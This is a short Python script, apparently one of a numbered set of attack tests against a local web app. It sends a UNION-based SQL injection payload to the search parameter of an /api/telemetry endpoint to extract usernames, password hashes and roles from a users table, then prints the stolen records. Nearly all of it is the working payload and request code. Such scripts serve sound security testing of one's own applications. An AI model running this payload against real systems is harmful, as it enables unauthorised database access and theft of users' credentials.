#!/usr/bin/env python3
"""Attack 2: SQL Injection (SQLi).

Extracts user credentials from the database via UNION-based injection in /api/telemetry.
"""

import requests

BASE_URL = "http://localhost:5000"


def test_attack_2():
    print("[+] Running Individual Attack 2: SQL Injection (SQLi)...")
    sqli_payload = "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,username,password_hash,role FROM users--"
    url = f"{BASE_URL}/api/telemetry"
    try:
        response = requests.get(url, params={"search": sqli_payload, "limit": 100}, timeout=5)
        print(f"[*] GET {url}?search=... - Status Code: {response.status_code}")
        if response.status_code == 200:
            data = response.json()
            print("[✓] SQLi vulnerability confirmed! Extracted records:")
            print(data)
        else:
            print(f"[!] Unexpected response: {response.text}")
    except Exception as e:
        print(f"[X] Connection error: {e}")


if __name__ == "__main__":
    test_attack_2()
